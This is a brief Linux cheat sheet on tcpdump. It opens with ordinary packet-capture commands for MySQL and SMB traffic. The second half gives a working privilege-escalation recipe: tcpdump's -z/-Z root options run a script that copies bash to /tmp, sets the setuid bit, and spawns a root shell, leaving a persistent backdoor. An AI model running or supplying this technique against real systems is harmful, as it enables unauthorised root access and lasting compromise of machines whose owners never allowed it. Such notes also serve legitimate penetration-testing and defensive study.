__tags: tcpdump linux tech

#### Use these commands to capture packets and output in pcap format!!!

```
sudo tcpdump -i en1 -n -w test.pcap tcp port 3306 and host 192.168.1.12
```

```
sudo tcpdump -i tun0 -n -w test.pcap tcp port 139
```

#### Use TCPDump to run commands if sudo

```bash
COMMAND='cp /bin/bash /tmp/bash_root && chmod +s /tmp/bash_root'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
/tmp/bash_root -p
```